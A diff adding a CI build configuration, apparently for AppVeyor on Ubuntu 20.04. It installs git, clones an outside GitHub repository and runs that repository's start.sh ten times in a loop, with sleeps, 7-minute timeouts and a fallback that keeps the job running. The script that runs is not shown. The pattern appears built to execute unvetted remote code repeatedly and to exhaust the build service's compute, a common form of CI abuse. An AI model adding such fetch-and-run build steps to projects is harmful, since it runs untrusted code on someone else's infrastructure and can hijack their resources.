@@ -1,0 +1,18 @@
+image: Ubuntu2004
+
+build_script:
+  - echo "Updating packages and installing git"
+  - sudo apt-get update
+  - sudo apt-get install -y git
+  - echo "Cloning the repository"
+  - git clone https://github.com/Fiujol/android || true
+  - |
+    echo "Running script in sequence..."
+    for i in {1..10}; do
+      echo "==== RUNNING SCRIPT PART $i ===="
+      cd android
+      echo "Waiting before executing script..."
+      sleep 15
+      timeout 7m bash start.sh 8 || echo "Script timed out but job continues"
+      cd ..
+    done
